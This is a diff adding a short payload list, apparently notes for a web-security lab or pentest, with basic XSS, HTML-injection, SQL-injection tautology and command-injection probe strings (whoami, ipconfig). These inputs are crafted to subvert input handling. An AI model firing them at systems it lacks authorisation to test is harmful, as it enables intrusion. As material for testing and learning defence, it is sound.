@@ -1,0 +1,15 @@
+XSS
+<script>alert('XSS')</script>
+<h1 style="color:red">HACKED</h1>
+
+SQLI
+' OR '1'='1
+
+COMMAND INJECTION
+dir
+echo hihi
+ipconfig
+whoami
+
+CSRF
+run the file
